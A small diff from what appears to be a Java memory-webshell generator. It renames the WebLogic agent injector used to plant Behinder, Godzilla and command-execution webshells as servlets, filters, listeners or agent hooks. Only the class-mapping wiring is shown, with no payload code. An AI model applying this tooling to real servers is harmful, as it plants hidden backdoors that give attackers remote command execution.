@@ -15,7 +15,7 @@ import com.reajason.javaweb.memshell.weblogic.godzilla.GodzillaListener;
 import com.reajason.javaweb.memshell.weblogic.injector.WebLogicFilterInjector;
 import com.reajason.javaweb.memshell.weblogic.injector.WebLogicListenerInjector;
 import com.reajason.javaweb.memshell.weblogic.injector.WebLogicServletInjector;
-import com.reajason.javaweb.memshell.weblogic.injector.WebLogicServletStubAgentInjector;
+import com.reajason.javaweb.memshell.weblogic.injector.WebLogicServletContextAgentInjector;
 import org.apache.commons.lang3.tuple.Pair;
 
 import java.util.Map;
@@ -27,7 +27,7 @@ import static com.reajason.javaweb.memshell.config.Constants.*;
  * @since 2024/12/24
  */
 public class WebLogicShell extends AbstractShell {
-    public static final String AGENT_SERVLET_STUB = AGENT + "ServletStub";
+    public static final String AGENT_SERVLET_CONTEXT = AGENT + "ServletContext";
 
     @Override
     protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
@@ -35,7 +35,7 @@ public class WebLogicShell extends AbstractShell {
                 SERVLET, Pair.of(BehinderServlet.class, WebLogicServletInjector.class),
                 FILTER, Pair.of(BehinderFilter.class, WebLogicFilterInjector.class),
                 LISTENER, Pair.of(BehinderListener.class, WebLogicListenerInjector.class),
-                AGENT_SERVLET_STUB, Pair.of(BehinderFilterChainAdvisor.class, WebLogicServletStubAgentInjector.class)
+                AGENT_SERVLET_CONTEXT, Pair.of(BehinderFilterChainAdvisor.class, WebLogicServletContextAgentInjector.class)
         );
     }
 
@@ -45,7 +45,7 @@ public class WebLogicShell extends AbstractShell {
                 SERVLET, Pair.of(CommandServlet.class, WebLogicServletInjector.class),
                 FILTER, Pair.of(CommandFilter.class, WebLogicFilterInjector.class),
                 LISTENER, Pair.of(CommandListener.class, WebLogicListenerInjector.class),
-                AGENT_SERVLET_STUB, Pair.of(CommandFilterChainAdvisor.class, WebLogicServletStubAgentInjector.class)
+                AGENT_SERVLET_CONTEXT, Pair.of(CommandFilterChainAdvisor.class, WebLogicServletContextAgentInjector.class)
         );
     }
 
@@ -55,7 +55,7 @@ public class WebLogicShell extends AbstractShell {
                 SERVLET, Pair.of(GodzillaServlet.class, WebLogicServletInjector.class),
                 FILTER, Pair.of(GodzillaFilter.class, WebLogicFilterInjector.class),
                 LISTENER, Pair.of(GodzillaListener.class, WebLogicListenerInjector.class),
-                AGENT_SERVLET_STUB, Pair.of(GodzillaFilterChainAdvisor.class, WebLogicServletStubAgentInjector.class)
+                AGENT_SERVLET_CONTEXT, Pair.of(GodzillaFilterChainAdvisor.class, WebLogicServletContextAgentInjector.class)
         );
     }
 }
